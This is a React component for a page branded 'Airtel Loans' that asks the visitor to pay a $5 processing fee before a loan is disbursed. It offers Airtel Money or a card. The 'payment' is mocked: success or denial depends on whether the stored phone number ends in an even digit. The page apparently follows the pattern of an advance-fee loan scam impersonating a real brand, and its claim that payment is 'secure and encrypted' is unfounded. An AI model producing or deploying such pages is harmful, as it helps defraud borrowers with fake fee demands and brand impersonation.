import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelPayment() {
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);

  const handlePay = () => {
    setIsProcessing(true);
    
    // Simulate a payment processing delay
    setTimeout(() => {
      setIsProcessing(false);
      
      // Mock validation logic: 
      // If the phone number ends in an even number (0, 2, 4, 6, 8), it's valid (Success).
      // If it ends in an odd number, it's invalid (Denied).
      const phone = localStorage.getItem('airtelPhone') || '';
      const lastDigit = parseInt(phone.slice(-1));
      
      if (!isNaN(lastDigit) && lastDigit % 2 === 0) {
        navigate('/airtel-success'); // Valid number
      } else {
        navigate('/airtel-denied');  // Invalid number
      }
    }, 1500);
  };

  return (
    <div className="airtel-container">
      {/* Header Section */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel Loans</h1>
        <p className="airtel-tagline">Quick loans. Anytime. Anywhere.</p>
      </div>

      {/* Main White Card */}
      <div className="airtel-card">
        {/* Back Link */}
        <button className="airtel-back-link" onClick={() => navigate(-1)}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Back
        </button>

        <h2 className="airtel-limit-heading">Pay Processing Fee</h2>
        <p className="airtel-limit-subtext">
          A processing fee of $5 is required to disburse your loan.
        </p>

        {/* Fee Amount Box */}
        <div className="airtel-limit-box">
          <span className="airtel-limit-label">Processing Fee</span>
          <span className="airtel-limit-amount">$5</span>
          <span className="airtel-limit-currency">USD</span>
        </div>

        {/* Payment Method Selector */}
        <div className="airtel-input-group">
          <label>Select Payment Method</label>
          <div className="airtel-payment-method">
            <div className="airtel-payment-option selected">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                <line x1="2" y1="10" x2="22" y2="10"></line>
              </svg>
              <span>Airtel Money</span>
            </div>
            <div className="airtel-payment-option">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                <line x1="2" y1="10" x2="22" y2="10"></line>
              </svg>
              <span>Credit / Debit Card</span>
            </div>
          </div>
        </div>

        {/* Pay Button */}
        <button 
          className="airtel-continue-btn" 
          onClick={handlePay}
          disabled={isProcessing}
        >
          {isProcessing ? 'Processing...' : 'Pay $5 Now'}
          {!isProcessing && (
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12"></line>
              <polyline points="12 5 19 12 12 19"></polyline>
            </svg>
          )}
        </button>

        {/* Footer Security Message */}
        <div className="airtel-footer">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
          </svg>
          <span>Your payment is secure and encrypted</span>
        </div>
      </div>
    </div>
  );
}

export default AirtelPayment;